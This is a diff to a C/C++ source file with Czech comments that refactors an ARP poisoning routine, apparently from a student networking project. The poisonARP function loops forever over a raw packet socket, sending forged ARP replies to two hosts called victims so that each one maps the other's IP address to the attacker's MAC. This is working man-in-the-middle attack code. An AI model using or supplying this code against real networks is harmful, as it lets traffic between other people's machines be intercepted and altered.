@@ -686,186 +686,26 @@ void printIP(u_char * ip)
 }
 //##################################################SPOOF#########################################################################
 
+/**
+ * Funkce pro rozesílání otrávených ARP paketů.
+ * @param intInfo - struktura s informacemi o interface
+ * @param time - odesílací čas
+ * @param mac1 - MAC adresa 1. oběti
+ * @param mac2 - MAC adresa 2. oběti
+ * @param ip1 - IP adresa 1. oběti
+ * @param ip2 - IP adresa 2. oběti
+ */
 void poisonARP(INTERFACE_INFO* intInfo, int time, char* mac1, char* mac2, char* ip1, char* ip2)
 {
-	ARP_HEADER arphdr;
-	int status, bytes, sockfd;
-	ssize_t datalen = 0;
-	uint8_t *src_mac, *dstMac, *ethFrame;
-	struct addrinfo hints, *res;
-	struct sockaddr_in *ipv4;
+	int sockfd;
 	struct sockaddr_ll device;
 	
-	// Alokace paměti
-	src_mac = allocate_ustrmem (ETH_ADDR_LEN);
-	dstMac = allocate_ustrmem (ETH_ADDR_LEN);
-	ethFrame = allocate_ustrmem (IP_MAXPACKET);
-		
-	while(1){
-
-		// Submit request for a raw socket descriptor.
-		if ((sockfd = socket (PF_PACKET, SOCK_RAW, htons (ETH_P_ALL))) < 0) {
-			perror ("socket() failed ");
-			exit (EXIT_FAILURE);
-		}
-
-		// Vytvoření MAC adresy ze stringu 
-		createMacAdress(dstMac,mac1);
-		 
-		// Fill out hints for getaddrinfo().
-		memset (&hints, 0, sizeof (struct addrinfo));
-		hints.ai_family = AF_INET;
-		hints.ai_socktype = SOCK_STREAM;
-		hints.ai_flags = hints.ai_flags | AI_CANONNAME;
-
-
-		memset (&device, 0, sizeof (device));
-		if ((device.sll_ifindex = if_nametoindex (intInfo->interface)) == 0) {
-			perror ("if_nametoindex() failed to obtain interface index ");
-			exit (EXIT_FAILURE);
-		}
-//		printf ("Index for interface %s is %i\n", intInfo->interface, device.sll_ifindex);
-		 
-		// Resolve target using getaddrinfo().
-		if ((status = getaddrinfo (ip1, NULL, &hints, &res)) != 0) {
-			fprintf (stderr, "getaddrinfo() failed: %s\n", gai_strerror (status));
-			exit (EXIT_FAILURE);
-		}
-		ipv4 = (struct sockaddr_in *) res->ai_addr;
-//		memcpy (&arphdr.tha, &ipv4->sin_addr, 4 * sizeof (uint8_t));
-		freeaddrinfo (res);
-
-		// Fill out sockaddr_ll.
-		device.sll_family = AF_PACKET;
-		memcpy (device.sll_addr, intInfo->interfaceMac, 6 * sizeof (uint8_t));
-		device.sll_halen = 6;
-
-		 // ARP header
-		createMacAdress(arphdr.tha,mac1);
-		arphdr.htype = htons (1);
-		arphdr.ptype = htons (ETH_P_IP);
-		arphdr.hlen = ETH_ADDR_LEN;
-		arphdr.plen = IP_ADDR_LEN;
-		arphdr.oper = htons (ARP_REPLY);
-		// Zdrojová adresa - moje
-		memcpy (&arphdr.sha, intInfo->interfaceMac, ETH_ADDR_LEN * sizeof (uint8_t));
-		// Nakopírování ip adres
-		inet_pton(AF_INET, ip1,&arphdr.tpa);
-		inet_pton(AF_INET, ip2,&arphdr.spa);
-
-		// Délka paketu
-		datalen = ETH_HDRLEN + ARP_HDR_LEN;
-		// Ethernetové adresy
-		memcpy (ethFrame, dstMac, ETH_ADDR_LEN * sizeof (uint8_t));
-		memcpy (ethFrame + ETH_ADDR_LEN, intInfo->interfaceMac, ETH_ADDR_LEN * sizeof (uint8_t));
-
-		ethFrame[12] = ETH_P_ARP / 256;
-		ethFrame[13] = ETH_P_ARP % 256;
-
-		// Namapování arp hlavičky na paket
-		memcpy (ethFrame + ETH_HDRLEN, &arphdr, ARP_HDR_LEN * sizeof (uint8_t));
-		 
-//		cerr<<"Testovací výpis:"<<endl;
-//		cerr<<"ETH src: ";
-//		printMAC(dstMac);
-//		cerr<<"\nETH dst: ";
-//		printMAC(intInfo->interfaceMac);
-//		cerr<<"\nARP THA: ";
-//		printMAC(arphdr.tha);
-//		cerr<<"\nARP TPA: ";
-//		printIP(arphdr.tpa);
-//		cerr<<"ARP SHA: ";
-//		printMAC(arphdr.sha);	
-//		cerr<<"\nARP SPA: ";
-//		printIP(arphdr.spa);	
-//		cerr<<"INT ADDR: ";
-//		printIP(intInfo->interfaceAdd);		 
-
-		// Send ethernet frame to socket.
-		if ((bytes = sendto (sockfd, ethFrame, datalen, 0, (struct sockaddr *) &device, sizeof (device))) <= 0) {
-			perror ("sendto() failed");
-			exit (EXIT_FAILURE);
-		}
-		
-		// Vytvoření MAC adresy ze stringu 
-		createMacAdress(dstMac,mac2);
-		createMacAdress(arphdr.tha,mac2);
-		inet_pton(AF_INET, ip2,&arphdr.tpa);
-		inet_pton(AF_INET, ip1,&arphdr.spa);
-		
-		// Zdrojová adresa - moje
-		memcpy (&arphdr.sha, intInfo->interfaceMac, ETH_ADDR_LEN * sizeof (uint8_t));
-		memcpy (ethFrame, dstMac, ETH_ADDR_LEN * sizeof (uint8_t));
-		memcpy (ethFrame + ETH_HDRLEN, &arphdr, ARP_HDR_LEN * sizeof (uint8_t));
-		
-		// Odeslání paketu - vice versa
-		if ((bytes = sendto (sockfd, ethFrame, datalen, 0, (struct sockaddr *) &device, sizeof (device))) <= 0) {
-			perror ("sendto() failed");
-			exit (EXIT_FAILURE);
-		}		
-		
-		close(sockfd);
-		usleep(time*1000000);
-	}
-}
-
-u_char* createMacAdress(uint8_t* newDstMac, char* mac1)
-{
-	unsigned int values[6];
-	int i;
-
-	if( 6 == sscanf( mac1, "%x:%x:%x:%x:%x:%x",
-		&values[0], &values[1], &values[2],
-		&values[3], &values[4], &values[5] ) )
-	{
-		/* convert to uint8_t */
-		for( i = 0; i < 6; ++i )
-			newDstMac[i] = (uint8_t) values[i];
-	}	
-	else{
-		cerr<<"Špatný formát MAC adresy!"<<endl;
-		exit(EXIT_FAILURE);
-	}
-	
-	return (u_char*)newDstMac;
-}
-
-void sendPoisonARP(u_char* srcMac,
-				char* srcIp,
-				char* dstMac,
-				char* dstIp,
-				char* SpoofMac,
-				char* interface)
-{
-	ARP_HEADER arphdr;
-	int status, bytes, sockfd;
-	ssize_t datalen = 0;
-	uint8_t *src_mac, *dstMac, *ethFrame;
-	struct addrinfo hints, *res;
-	struct sockaddr_in *ipv4;
-	struct sockaddr_ll device;
-	
-	// Alokace paměti
-	src_mac = allocate_ustrmem (ETH_ADDR_LEN);
-	dstMac = allocate_ustrmem (ETH_ADDR_LEN);
-	ethFrame = allocate_ustrmem (IP_MAXPACKET);
-		
-	// Submit request for a raw socket descriptor.
-	if ((sockfd = socket (PF_PACKET, SOCK_RAW, htons (ETH_P_ALL))) < 0) {
-		perror ("socket() failed ");
-		exit (EXIT_FAILURE);
-	}
-
-	// Vytvoření MAC adresy ze stringu 
-	createMacAdress(dstMac,mac1);
-
 	// Fill out hints for getaddrinfo().
-	memset (&hints, 0, sizeof (struct addrinfo));
-	hints.ai_family = AF_INET;
-	hints.ai_socktype = SOCK_STREAM;
-	hints.ai_flags = hints.ai_flags | AI_CANONNAME;
-
-
+//	memset (&hints, 0, sizeof (struct addrinfo));
+//	hints.ai_family = AF_INET;
+//	hints.ai_socktype = SOCK_STREAM;
+//	hints.ai_flags = hints.ai_flags | AI_CANONNAME;
+	
 	memset (&device, 0, sizeof (device));
 	if ((device.sll_ifindex = if_nametoindex (intInfo->interface)) == 0) {
 		perror ("if_nametoindex() failed to obtain interface index ");
@@ -873,38 +713,109 @@ void sendPoisonARP(u_char* srcMac,
 	}
 //		printf ("Index for interface %s is %i\n", intInfo->interface, device.sll_ifindex);
 
-	// Resolve target using getaddrinfo().
-	if ((status = getaddrinfo (ip1, NULL, &hints, &res)) != 0) {
-		fprintf (stderr, "getaddrinfo() failed: %s\n", gai_strerror (status));
-		exit (EXIT_FAILURE);
-	}
-	ipv4 = (struct sockaddr_in *) res->ai_addr;
-//		memcpy (&arphdr.tha, &ipv4->sin_addr, 4 * sizeof (uint8_t));
-	freeaddrinfo (res);
+//	// Resolve target using getaddrinfo().
+//	if ((status = getaddrinfo (ip1, NULL, &hints, &res)) != 0) {
+//		fprintf (stderr, "getaddrinfo() failed: %s\n", gai_strerror (status));
+//		exit (EXIT_FAILURE);
+//	}
+//	ipv4 = (struct sockaddr_in *) res->ai_addr;
+////		memcpy (&arphdr.tha, &ipv4->sin_addr, 4 * sizeof (uint8_t));
+//	freeaddrinfo (res);
 
 	// Fill out sockaddr_ll.
+	
 	device.sll_family = AF_PACKET;
 	memcpy (device.sll_addr, intInfo->interfaceMac, 6 * sizeof (uint8_t));
 	device.sll_halen = 6;
+			
+	while(1){
+		// Vytvoření socketu
+		if ((sockfd = socket (PF_PACKET, SOCK_RAW, htons (ETH_P_ALL))) < 0) {
+			perror ("socket() failed ");
+			exit (EXIT_FAILURE);
+		}
+		// Zasílání paketů oběma obětem
+		sendPacketARP(intInfo->interfaceMac,ip1,mac2,ip2,sockfd, device);
+		sendPacketARP(intInfo->interfaceMac,ip2,mac1,ip1,sockfd, device);
+		
+		close(sockfd);
+		usleep(time*1000000);
+	}
+}
+
+/**
+ * Funkce pro konverzi MAC adresy ve formátu char na u_char/uint8_t
+ * @param outMac - ukazatel na místo v paměti pro výsledek
+ * @param inMac - vstupní MAC adresa (char)
+ * @return 
+ */
+u_char* createMacAdress(uint8_t* outMac, char* inMac)
+{
+	unsigned int values[6];
+	int i;
+
+	if( 6 == sscanf( inMac, "%x:%x:%x:%x:%x:%x",
+		&values[0], &values[1], &values[2],
+		&values[3], &values[4], &values[5] ) )
+	{
+		/* convert to uint8_t */
+		for( i = 0; i < 6; ++i )
+			outMac[i] = (uint8_t) values[i];
+	}	
+	else{
+		cerr<<"Špatný formát MAC adresy!"<<endl;
+		exit(EXIT_FAILURE);
+	}
+	
+	return (u_char*)outMac;
+}
+
+/**
+ * Funkce pro odeslání otráveného/správného ARP paketu.
+ * @param srcMac - zdrojová MAC adresa
+ * @param srcIp - zdrojová IP adresa
+ * @param dstMac - cílová MAC adresa
+ * @param dstIp - cílová IP adresa
+ * @param socket - socket
+ * @param device - informace interface pro odeslání
+ */
+void sendPacketARP(u_char* srcMac,
+				char* srcIp,
+				char* dstMac,
+				char* dstIp,
+				int socket,
+				struct sockaddr_ll device)
+{
+	ARP_HEADER arphdr;
+	int bytes;
+	ssize_t datalen = 0;
+	uint8_t *dst_mac, *ethFrame;
+	
+	// Alokace paměti
+	dst_mac = allocate_ustrmem (ETH_ADDR_LEN);
+	ethFrame = allocate_ustrmem (IP_MAXPACKET);
+		
+	// Vytvoření MAC adresy ze stringu 
+	createMacAdress(dst_mac,dstMac);
 
 	 // ARP header
-	createMacAdress(arphdr.tha,mac1);
+	createMacAdress(arphdr.tha,dstMac);
 	arphdr.htype = htons (1);
 	arphdr.ptype = htons (ETH_P_IP);
 	arphdr.hlen = ETH_ADDR_LEN;
 	arphdr.plen = IP_ADDR_LEN;
 	arphdr.oper = htons (ARP_REPLY);
 	// Zdrojová adresa - moje
-	memcpy (&arphdr.sha, intInfo->interfaceMac, ETH_ADDR_LEN * sizeof (uint8_t));
+	memcpy (&arphdr.sha, srcMac, ETH_ADDR_LEN * sizeof (uint8_t));
 	// Nakopírování ip adres
-	inet_pton(AF_INET, ip1,&arphdr.tpa);
-	inet_pton(AF_INET, ip2,&arphdr.spa);
+	inet_pton(AF_INET, srcIp,&arphdr.spa);
+	inet_pton(AF_INET, dstIp,&arphdr.tpa);
 
 	// Délka paketu
 	datalen = ETH_HDRLEN + ARP_HDR_LEN;
 	// Ethernetové adresy
-	memcpy (ethFrame, dstMac, ETH_ADDR_LEN * sizeof (uint8_t));
-	memcpy (ethFrame + ETH_ADDR_LEN, intInfo->interfaceMac, ETH_ADDR_LEN * sizeof (uint8_t));
+	memcpy (ethFrame, dst_mac, ETH_ADDR_LEN * sizeof (uint8_t));
+	memcpy (ethFrame + ETH_ADDR_LEN, srcMac, ETH_ADDR_LEN * sizeof (uint8_t));
 
 	ethFrame[12] = ETH_P_ARP / 256;
 	ethFrame[13] = ETH_P_ARP % 256;
@@ -913,7 +824,7 @@ void sendPoisonARP(u_char* srcMac,
 	memcpy (ethFrame + ETH_HDRLEN, &arphdr, ARP_HDR_LEN * sizeof (uint8_t));
 
 	// Send ethernet frame to socket.
-	if ((bytes = sendto (sockfd, ethFrame, datalen, 0, (struct sockaddr *) &device, sizeof (device))) <= 0) {
+	if ((bytes = sendto (socket, ethFrame, datalen, 0, (struct sockaddr *) &device, sizeof (device))) <= 0) {
 		perror ("sendto() failed");
 		exit (EXIT_FAILURE);
 	}
